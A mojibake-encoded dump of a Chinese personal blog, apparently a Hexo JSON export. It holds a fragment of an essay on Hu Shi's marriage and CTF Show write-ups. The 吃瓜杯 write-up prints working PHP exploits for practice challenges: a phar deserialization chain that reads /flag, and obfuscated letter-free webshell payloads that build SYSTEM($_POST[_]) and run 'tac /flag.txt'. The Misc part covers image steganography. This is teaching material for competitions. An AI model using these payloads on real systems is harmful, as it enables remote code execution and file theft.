ï¼Œå¥¹èƒ½å®¹å¿èƒ¡é€‚çš„é£èŠ±é›ªæœˆï¼Œä½†å¥¹å°±æ˜¯ä¸æ„¿æ„åŸè°…ï¼Œæ›¾ç»é‚£ä¹ˆä¿¡ä»»çš„ä¸¤ä¸ªäººï¼Œå˜´ ä¸Šè¯´ç€è¡¨å“¥è¡¨å¦¹ï¼ŒèƒŒåœ°é‡Œå´ç‹ ç‹ èƒŒå›äº†å¥¹ã€‚ å¼ çˆ±ç²è¯´ï¼šâ€ä»–ä»¬ï¼ˆèƒ¡é€‚å’Œæ±Ÿå†¬ç§€ï¼‰æ˜¯æ—§å¼å©šå§»ç½•æœ‰çš„å¹¸ç¦ä¾‹å­ã€‚â€ å¥¹çœ‹å¤šäº†æ—§å¼å©šå§»ä¹‹ä¸­å¥³äººçš„æ‚²å‰§ï¼Œå¥¹ç»å¯¹ä¸èƒ½åšæ€¨å¦‡ï¼Œä¸èƒ½è¢«ä¸ˆå¤«ç‰µç€é¼»å­èµ°ï¼Œè€Œæ˜¯è®©èƒ¡é€‚åœ¨ ç”Ÿæ´»ä¸­ä¾èµ–å¥¹ï¼Œåœ¨å¿ƒä¸­æ•¬é‡å¥¹ï¼Œåœ¨æ„Ÿæƒ…ä¸Šä¸èƒ½è½»æ˜“æ”¾å¼ƒå¥¹ã€‚ èƒ¡é€‚å’Œæ±Ÿå†¬ç§€å¼¯å¼¯ç»•ç»•ï¼Œç»ˆäºèµ°å‘ç™½å¤´åŠŸå¾·åœ†æ»¡ï¼Œä»–ä»åˆšå¼€å§‹çš„è¡¡é‡ç®—è®¡ï¼Œå§”å±ˆæ±‚å…¨ï¼Œåˆ°çœŸæ­£ä¸º æ±Ÿå†¬ç§€æŠ˜æœã€‚ä¸–äººç¬‘ä»–ä¸€ä½è¥¿è£…å®¢å¨¶äº†å°è„šå¥³ï¼Œå“ªçŸ¥åœ¨æ±Ÿå†¬ç§€çš„äººç”Ÿå“²ç†å‰ï¼Œèƒ¡é€‚çš„é‚£äº›å°èªæ˜ çœŸçš„å°±ä¸ç®—ä»€ä¹ˆäº‹å„¿äº†ã€‚ æ€å›ä¸è§ï¼Œå€æ„Ÿæ€å›ï¼›åˆ«ç¦»éš¾å¿ï¼Œå¿ç—›åˆ«ç¦»ã€‚","categories":[{"name":"ç”Ÿæ´»æ‚è°ˆ","slug":"ç”Ÿæ´»æ‚è°ˆ","permalink":"https://xizhi-future.github.io/categories/%E7%94%9F%E6%B4%BB%E6%9D%82%E8%B0%88/"}],"tags":[],"author":"xizhi-future"},{"title":"CTF-Show-åƒç“œæ¯","slug":"CTF-Show-åƒç“œæ¯","date":"2021-10-01T11:19:34.000Z","updated":"2021-10-01T11:20:18.220Z","comments":true,"path":"2021/10/01/CTF-Show-åƒç“œæ¯/","link":"","permalink":"https://xizhi-future.github.io/2021/10/01/CTF-Show-%E5%90%83%E7%93%9C%E6%9D%AF/","excerpt":"CTF Show åƒç“œæ¯ç¯‡ã€‚","text":"CTF Show åƒç“œæ¯ç¯‡ã€‚ CTF Show åƒç“œæ¯çƒ­èº«123456789101112131415161718&lt;?phpinclude(&quot;flag.php&quot;);highlight_file(__FILE__);if(isset($_GET[&#x27;num&#x27;]))&#123; $num = $_GET[&#x27;num&#x27;]; if($num==4476)&#123; die(&quot;no no no!&quot;); &#125; if(preg_match(&quot;/[a-z]|\\./i&quot;, $num))&#123; die(&quot;no no no!!&quot;); &#125; if(!strpos($num, &quot;0&quot;))&#123; die(&quot;no no no!!!&quot;); &#125; if(intval($num,0)===4476)&#123; echo $flag; &#125;&#125; 123?num=%20010574?num=%0c010574?num=%0a010574 ATTupzip æ–‡ä»¶ä¸Šä¼  + æ–‡ä»¶åŒ…å« file_get_contents â€”&gt; phar ååºåˆ—åŒ– æ–‡ä»¶å†…å®¹è¿‡æ»¤ &lt;? php ï¼Œè¿‡æ»¤ &lt;? ï¼Œæ— æ³•æ­£å¸¸è§£æä¸º php ä»£ç  ä¸Šä¼ æˆåŠŸå‘ç°ï¼šåºåˆ—åŒ–ä¸ååºåˆ—åŒ– 123456789101112131415161718192021class View &#123; public $fn; public function __invoke()&#123; $text = base64_encode(file_get_contents($this-&gt;fn)); echo &quot;&lt;script&gt;alert(&#x27;&quot;.$text.&quot;&#x27;);self.location=document.referrer;&lt;/script&gt;&quot;; &#125;&#125;class Fun&#123; public $fun = &quot;:)&quot;; public function __toString()&#123; $fuc = $this-&gt;fun; $fuc(); return &quot;&lt;script&gt;alert(&#x27;Be a happy string~&#x27;);self.location=document.referrer;&lt;/script&gt;&quot;; &#125; public function __destruct() &#123; echo &quot;&lt;script&gt;alert(&#x27;Just a fun &quot;.$this-&gt;fun.&quot;&#x27;);self.location=document.referrer;&lt;/script&gt;&quot;; &#125;&#125;$filename = $_POST[&quot;file&quot;];$stat = @stat($filename); 12__toString() //æŠŠç±»å½“ä½œå­—ç¬¦ä¸²ä½¿ç”¨æ—¶è§¦å‘ echo å¯¹è±¡; $text=$test+$å¯¹è±¡ï¼› __invoke() //å½“å°è¯•ä»¥è°ƒç”¨å‡½æ•°çš„æ–¹å¼è°ƒç”¨ä¸€ä¸ªå¯¹è±¡æ—¶ï¼Œè¯¥æ–¹æ³•ä¼šè¢«è‡ªåŠ¨è°ƒç”¨ ç”Ÿæˆ .phar æ–‡ä»¶ï¼š æˆ‘ä»¬çš„ç›®çš„æ˜¯æˆåŠŸåˆ›å»º View å¯¹è±¡ç„¶åæˆåŠŸè°ƒç”¨ __invoke() æ–¹æ³•ï¼Œåˆ©ç”¨ file_get_contents æ¥è¯»å–åˆ°æ–‡ä»¶ä¸­çš„å†…å®¹ã€‚ 1234567891011121314151617181920212223242526272829303132&lt;?phpclass View&#123; public $fn; public function __invoke()&#123; $text = base64_encode(file_get_contents($this-&gt;fn)); echo &quot;&lt;script&gt;alert(&#x27;&quot;.$text.&quot;&#x27;);self.location=document.referrer;&lt;/script&gt;&quot;; &#125;&#125;class Fun&#123; public $fun=&#x27;:)&#x27;; public function __toString()&#123; $fuc = $this-&gt;fun; $fuc(); return &quot;&lt;script&gt;alert(&#x27;Be a happy string~&#x27;);self.location=document.referrer;&lt;/script&gt;&quot;; &#125; public function __destruct() &#123; echo &quot;&lt;script&gt;alert(&#x27;Just a fun &quot;.$this-&gt;fun.&quot;&#x27;);self.location=document.referrer;&lt;/script&gt;&quot;; &#125;&#125;$phar = new Phar(&#x27;123.phar&#x27;);$phar -&gt; stopBuffering();$phar -&gt; setStub(&#x27;GIF89a&#x27;.&#x27;&amp;lt;?= __HALT_COMPILER(); ?&amp;gt;&#x27;);$b = new Fun();$b-&gt;fun= new Fun();$b-&gt;fun-&gt;fun=new View(); # å½“å°è¯•ä»¥è°ƒç”¨å‡½æ•°çš„æ–¹å¼è°ƒç”¨ä¸€ä¸ªå¯¹è±¡æ—¶ï¼Œ__invoke() æ–¹æ³•ä¼šè¢«è‡ªåŠ¨è°ƒç”¨$b-&gt;fun-&gt;fun-&gt;fn=&#x27;/flag&#x27;;$phar -&gt; addFromString(&#x27;test.txt&#x27;,&#x27;test&#x27;);$phar -&gt; setMetadata($b);$phar -&gt; stopBuffering(); &lt;? è¿‡æ»¤ï¼Œä½¿ç”¨ å®ä½“html ç¼–ç ä»£æ›¿ ï¼Œ&amp;lt; &amp;gt; è®¿é—®ï¼Œç”Ÿæˆ 123.phar æ›´æ”¹åç¼€å¾—åˆ° 123.zip ä¸Šä¼  æŸ¥è¯¢ 123.zip 1file=phar://123.zip é­”å¥³ æ³¨å†Œ æ³¨å†ŒæˆåŠŸï¼Œç™»å½• 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263layui.use([&#x27;layer&#x27;, &#x27;form&#x27;,&#x27;table&#x27;,&#x27;element&#x27;], function()&#123; var layer = layui.layer ,form = layui.form ,table = layui.table ,element = layui.element &#125;); function home()&#123; $.cookie(&#x27;m&#x27;,&#x27;main&#x27;); $.cookie(&#x27;ctfshow&#x27;,&#x27;0x36d|&#x27;+&#x27;&#x27;); location.replace(location.href); &#125; function logout()&#123; $.cookie(&#x27;m&#x27;,&#x27;logout&#x27;); $.cookie(&#x27;ctfshow&#x27;,&#x27;0x36d|&#x27;+&#x27;&#x27;); location.replace(location.href); &#125; function saveAvatar()&#123; $.cookie(&#x27;m&#x27;,&#x27;download&#x27;); $.cookie(&#x27;ctfshow&#x27;,&#x27;0x36d|&#x27;+&#x27;avatar.jpg|true&#x27;); window.open(location.href); &#125; function avatar()&#123; layer.prompt(&#123; formType: 0, value: &#x27;http://xxx.com/x.jpg(å…¶ä»–æ ¼å¼æ— æ•ˆ)&#x27;, title: &#x27;ä¿®æ”¹å¤´åƒ&#x27;, &#125;, function(value, index, elem)&#123; layer.close(index); $.cookie(&#x27;ctfshow&#x27;,&#x27;0x36d|&#x27;+&#x27;xixi|&#x27;+value); $.cookie(&#x27;m&#x27;,&#x27;changeavatar&#x27;); location.replace(location.href); &#125;); &#125; function profile()&#123; $.cookie(&#x27;m&#x27;,&#x27;page&#x27;); $.cookie(&#x27;ctfshow&#x27;,&#x27;0x36d|&#x27;+&#x27;&#x27;); location.replace(location.href); &#125; function changePSW()&#123; layer.prompt(&#123; formType: 0, value: &#x27;è¯·è¾“å…¥å½“å‰å¯†ç &#x27;, title: &#x27;ä¿®æ”¹å¯†ç &#x27;, &#125;, function(value, index, elem)&#123; $.cookie(&#x27;ctfshow&#x27;,&#x27;0x36d|&#x27;+value); layer.close(index); layer.prompt(&#123; formType: 0, value: &#x27;è¯·è¾“å…¥æ–°å¯†ç &#x27;, title: &#x27;ä¿®æ”¹å¯†ç &#x27;, &#125;, function(value, index, elem)&#123; layer.close(index); $.cookie(&#x27;ctfshow&#x27;,$.cookie(&#x27;ctfshow&#x27;)+&#x27;|&#x27;+value); $.cookie(&#x27;m&#x27;,&#x27;changepwd&#x27;); location.replace(location.href); &#125;); &#125;); &#125; shellme_Revenge 1/?looklook=1 1&lt;?phperror_reporting(0);if ($_GET[&#x27;looklook&#x27;])&#123; highlight_file(__FILE__);&#125;else&#123; setcookie(&quot;hint&quot;, &quot;?looklook&quot;, time()+3600);&#125;if (isset($_POST[&#x27;ctf_show&#x27;])) &#123; $ctfshow = $_POST[&#x27;ctf_show&#x27;]; if (is_string($ctfshow) || strlen($ctfshow) &lt;= 107) &#123; if (!preg_match(&quot;/[!@#%^&amp;*:&#x27;\\&quot;|`a-zA-BD-Z~\\\\\\\\]|[4-9]/&quot;,$ctfshow))&#123; eval($ctfshow); &#125;else&#123; echo(&quot;fucccc hacker!!&quot;); &#125; &#125;&#125; else &#123; phpinfo();&#125;?&gt; assert() 1&lt;?php$_=[];$_=@&quot;$_&quot;; // $_=&#x27;Array&#x27;;$_=$_[&#x27;!&#x27;==&#x27;@&#x27;]; // $_=$_[0];$___=$_; // A$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__; // S$___.=$__; // S$__=$_;$__++;$__++;$__++;$__++; // E $___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // R$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T$___.=$__;$____=&#x27;_&#x27;;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T$____.=$__;$_=$$____;eval($___($_[_])); // ASSERT($_POST[_]); system() 1&lt;?php$_=C;//$_=$_[0]; //Cprint_r($_);$___=$_;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___=$__; // Sprint_r($__);//$__=$_;$__++;$__++;$__++;$__++;$__++;$__++; // Y$___.=$__;print_r($__);$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__; // Sprint_r($__);$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__; // Tprint_r($__);$__=$_;$__++;$__++;$___.=$__; // Eprint_r($__);$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__; // Mprint_r($__);print_r($___); //SYSTEM$____=_;$__=$_;//print_r($_);$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P$____.=$__;print_r($__);$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O$____.=$__;print_r($__);$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S$____.=$__;print_r($__);$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T$____.=$__;print_r($____);//_POSTprint_r($___);//SYSTEM$_=$$____;eval($___($_[_])); // SYSTEM($_POST[_]); 1&lt;?php//$_=[C];$_=$_[0];$___=$_;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___=$__;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$____=&#x27;_&#x27;;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$_=$$____;eval($___($_[_]));//$_=C;$___=$_;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___=$__;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$____=_;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$_=$$____;eval($___($_[_]));highlight_file(__FILE__);$a = $_GET[&#x27;a&#x27;];if (!preg_match(&quot;/[!@#%^&amp;*:&#x27;\\&quot;|`a-zA-BD-Z~\\\\\\\\]|[4-9]/&quot;,$ctfshow))&#123; echo &#x27;111&#x27;; eval($a);&#125; 1#get?looklook=1#postctf[show=%24_%3DC%3B%24___%3D%24_%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24___%3D%24__%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24___.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24___.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24___.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24___.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24___.%3D%24__%3B%24____%3D_%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24____.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24____.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24____.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24____.%3D%24__%3B%24_%3D%24%24____%3B%24___(%24_%5B_%5D)%3B&amp;_=ls; é•¿åº¦é™åˆ¶ï¼š 1# get?looklook=1&amp;1=passthru&amp;2=tac /flag.txt# postctf[show=$_=C;$_++;$C=++$_;$_++;$C_=++$_;$_=(C/C.C)&#123;0&#125;;$_++;$_++;$_++;$_++;$_++;$_=_.$C_.$C.++$_;$&#123;$_&#125;&#123;1&#125;($&#123;$_&#125;&#123;2&#125;); åƒç“œ 50 4B 03 04 ZIPæ–‡ä»¶ è¿™æ˜¯ç”¨æ¥è¿·æƒ‘çš„ å­˜åœ¨ä¸€ä¸ªæ–‡æœ¬æ–‡æ¡£ï¼Œæ˜¯ä¸ª å›¾ç‰‡ï¼Œæµè§ˆå™¨è®¿é—® æ‰«æå¾—åˆ° cfhwc19abika_etso{h_u_e_ui1} æŸ¥çœ‹å›¾ç‰‡å±æ€§ 1âœ¿â‡âœ¼â„âœ¿â‡âœ¼â‚âƒâ†âœ¿âœ½â‚ââ‰âœ¼==# ä¸çŸ¥é“æ€æœ«ç”¨ äºŒã€æ€»ç»“å‘½ä»¤æ‰§è¡Œåšé¢˜æ€è·¯ ä¸€çœ¼å°±æœ‰æ€è·¯çš„ç›´æ¥æ è¿‡ ä¸€çœ¼æ²¡æœ‰æ€è·¯çš„ï¼Œé¦–å…ˆæ ¹æ®æ­£åˆ™çš„è¿‡æ»¤åˆ†ç±»ï¼Œå†³å®šæ€è·¯ æœ‰å›æ˜¾ï¼Ÿæ— å›æ˜¾ï¼Ÿ eval exec eval è¿˜æ˜¯ system æ— å­—æ¯æ•°å­—ç±»ï¼Ÿ å¼‚æˆ–ï¼Ÿæˆ–ï¼Ÿå–åï¼Ÿè‡ªå¢ï¼Ÿ è¿‡æ»¤ ; è¿‡æ»¤ â€˜ â€˜ â€œ â€œ æ‰¾ phpinfo() çœ‹è¢« ban çš„å‡½æ•°å","categories":[{"name":"CTF Show","slug":"CTF-Show","permalink":"https://xizhi-future.github.io/categories/CTF-Show/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://xizhi-future.github.io/tags/CTF/"}],"author":"xizhi-future"},{"title":"CTF-Show-Miscå…¥é—¨","slug":"CTF-Show-Miscå…¥é—¨","date":"2021-10-01T11:17:47.000Z","updated":"2021-10-01T11:18:54.358Z","comments":true,"path":"2021/10/01/CTF-Show-Miscå…¥é—¨/","link":"","permalink":"https://xizhi-future.github.io/2021/10/01/CTF-Show-Misc%E5%85%A5%E9%97%A8/","excerpt":"CTF Show Misc å…¥é—¨ç¯‡ã€‚","text":"CTF Show Misc å…¥é—¨ç¯‡ã€‚ Misc å…¥é—¨1.1 misc 1 â€” QQæˆªå›¾ ç›´æ¥è¯†åˆ«å›¾ç‰‡å†…å®¹ å›¾ç‰‡ç›´æ¥æ˜¯è¿™ä¸ªï¼Œæˆ‘ä»¬å¯ä»¥ QQ æˆªå›¾ï¼Œä½¿ç”¨å½“ä¸­çš„ å±å¹•è¯†åˆ« å³å¯è¯†åˆ«å‡ºæ–‡å­— 1.2 misc 2 â€” png å›¾ç‰‡è¯†åˆ« è®°äº‹æœ¬æ‰“å¼€æ˜¯è¿™æ ·ï¼Œé‚£è‚¯å®šä¸æ˜¯ .txt æ–‡æœ¬æ–‡ä»¶ ä½¿ç”¨ Editor010 æ‰“å¼€ è¯´æ˜è¿™æ˜¯ png æ–‡ä»¶ï¼Œä¿®æ”¹åç¼€ï¼Œç„¶å QQ å±å¹•è¯†å›¾å³å¯ è¡¥å……çŸ¥è¯†ï¼šPython3 è¿›è¡Œå›¾ç‰‡è¯†åˆ« https://segmentfault.com/a/1190000014091417 1.3 misc 3 â€” æŸ¥çœ‹ bpg å›¾ç‰‡æ˜¯ bpg å›¾ç‰‡ï¼Œéœ€è¦ä¸“é—¨çš„æŸ¥çœ‹å·¥å…· https://bellard.org/bpg/ 12# ä½¿ç”¨\\bpj\\bpgview.exe misc3.bpg 1.4 misc 4 â€” å›¾ç‰‡æ ¼å¼ + æ–‡ä»¶å¤´å›¾ç‰‡æ ¼å¼ JPEGæ–‡ä»¶å¤´ï¼šFF D8 FF æ–‡ä»¶å°¾ï¼šFF D9 TGAæœªå‹ç¼©çš„å‰4å­—èŠ‚ 00 00 02 00RLEå‹ç¼©çš„å‰5å­—èŠ‚ 00 00 10 00 00 PNG æ–‡ä»¶å¤´ï¼š89 50 4E 47 0D 0A 1A 0A æ–‡ä»¶å°¾ï¼šAE 42 60 82 GIF æ–‡ä»¶å¤´ï¼š47 49 46 38 39(37) 61 æ–‡ä»¶å°¾ï¼š00 3B BMP æ–‡ä»¶å¤´ï¼š42 4D æ–‡ä»¶å¤´æ ‡è¯†(2 bytes) 42(B) 4D(M) TIFF (tif) æ–‡ä»¶å¤´ï¼š49 49 2A 00 ico æ–‡ä»¶å¤´ï¼š00 00 01 00 Adobe Photoshop (psd) æ–‡ä»¶å¤´ï¼š38 42 50 53 ä¸€ä¸ªä¸€ä¸ªæŸ¥çœ‹ï¼Œä¿®æ”¹åç¼€ 1.txt png 2.txt jpg 3.txt bmp 4.txt gif 5.txt tif 6.txt webp 1.5 misc 5 â€” png æ–‡ä»¶å°¾ æ·»å†…å®¹ 010æ‰“å¼€ å‘ç°åœ¨ png çš„æ–‡ä»¶å°¾åé¢å¤šå‡ºäº† 1.6 misc 6 â€” jpg æ–‡ä»¶ æ·»å†…å®¹ 1.7 misc 7 â€” flagåœ¨å›¾ç‰‡æ–‡ä»¶ä¿¡æ¯ä¸­flagåœ¨å›¾ç‰‡æ–‡ä»¶ä¿¡æ¯ä¸­ã€‚ å¸¸ç”¨åˆ°çš„æ‰‹æ®µè¿˜æœ‰ å³é”®â€“å±æ€§ å·¥å…· å›¾è™«æŸ¥çœ‹å™¨ èƒ½å¤ŸæŸ¥çœ‹å›¾ç‰‡çš„è¯¦ç»†ä¿¡æ¯ 1.8 misc 8 â€” flagåœ¨å›¾ç‰‡æ–‡ä»¶ä¸­å›¾ç‰‡æ–‡ä»¶ä¸­ â€” binwalk foremostflagåœ¨å›¾ç‰‡æ–‡ä»¶ä¸­å›¾ç‰‡æ–‡ä»¶ä¸­ã€‚ 010 æ‰“å¼€ å¯ä»¥å‘ç°ï¼Œè¯¥ png å›¾ç‰‡å½“ä¸­ è¿˜åŒ…å«ç€ä¸€å¼  png å›¾ç‰‡ å›¾ç‰‡éšè—æ–‡ä»¶ binwalk foremost https://blog.csdn.net/Sc0fie1d/article/details/101602492 1.9 misc 9 â€” flagåœ¨å›¾ç‰‡å—é‡Œ 1.10 misc 10 â€” flagåœ¨å›¾ç‰‡æ•°æ®é‡Œ ä¸¤ä¸ª IDAT å— binwalk å·¥å…· è§£é‡Šï¼šzlib æ˜¯ PNG IDAT å—æ•°æ®å¯é€‰çš„å‹ç¼©æ ¼å¼ é¢˜è€…è‡ªå·±ç”Ÿæˆäº†ä¸€æ®µ zlib å‹ç¼©æ•°æ®ï¼Œç„¶ååŠ ä¸Šé•¿åº¦ä½ã€æ ‡è¯†ä½ã€ä¸ CRC æ ¡éªŒä½ï¼Œå°†å…¶ä¼ªè£…æˆäº†ä¸€ä¸ª IDAT å—ï¼Œæ’åœ¨å›¾ç‰‡å½“ä¸­ è€Œ binwalk ä¼šè‡ªåŠ¨æ‰¾åˆ° zlib å—å¹¶æå–å‡ºæ¥è§£å‹ï¼Œæ‰€ä»¥æœ€ç»ˆå¾—åˆ°çš„æå–ç»“æœä¸­å°±å«æœ‰ flag äº† 1.11 misc 11 â€” flagåœ¨å¦ä¸€å¼ å›¾é‡Œ ä¸¤ä¸ª IDAT å— å†æ¬¡ä½¿ç”¨ä¸Šä¸€å…³çš„è§£æ³•ï¼Œä¸å¯è¡Œ æœé›†èµ„æ–™ä¹‹åï¼Œå¿…é¡»é¦–å…ˆå°†å¤šä½™çš„é‚£ä¸ª IDAT å—åˆ é™¤æ‰å¯ å·¥å…· tweakpng å°†ç¬¬ä¸€ä¸ª IDAT å—å³é”®åˆ é™¤å³å¯ ctfshow{44620176948fa759d3eeafeac99f1ce9} 1.12 misc 12 â€” flagåœ¨å¦ä¸€å¼ å›¾é‡Œflagåœ¨å¦ä¸€å¼ å›¾é‡Œã€‚ ä¸ä¸Šä¸€å…³çš„åšæ³•ç›¸åŒï¼Œåªä¸è¿‡ï¼Œä¸ç¡®å®šåˆ é™¤å‡ ä¸ª IDAT å—ï¼Œæ¯æ¬¡åˆ å®Œä¸€ä¸ªä¿å­˜å°è¯•æŸ¥çœ‹å³å¯ 1.13 misc 13 â€” flagä½ç½®åœ¨å›¾ç‰‡æœ«å°¾flagä½ç½®åœ¨å›¾ç‰‡æœ«å°¾ã€‚ å¯ä»¥çœ‹åˆ°ä¸€éƒ¨åˆ†ç±»ä¼¼ flag çš„å­—ç¬¦ä¸² æˆ‘ä»¬å°†ä¹±ä¸ƒå…«ç³Ÿçš„åˆ é™¤å³å¯ï¼Œæ¯éš”ä¸€ä¸ªåˆ é™¤ä¸€ä¸ª 1.14 misc 14 â€” flagåœ¨é‚£å¼ å›¾é‡Œflagåœ¨é‚£å¼ å›¾é‡Œã€‚ è®°å¾—ä» FF D8 å¼€å§‹ æ–°å»ºä¸€ä¸ªæ–°çš„æ–‡ä»¶ jpg æ‰“å¼€ æ³¨æ„ï¼šQQè¯†å›¾ æœ‰æ—¶ä¸å‡†ç¡®ï¼Œæ¯”å¦‚ 0 å’Œ 8 1.15 misc 15 â€” 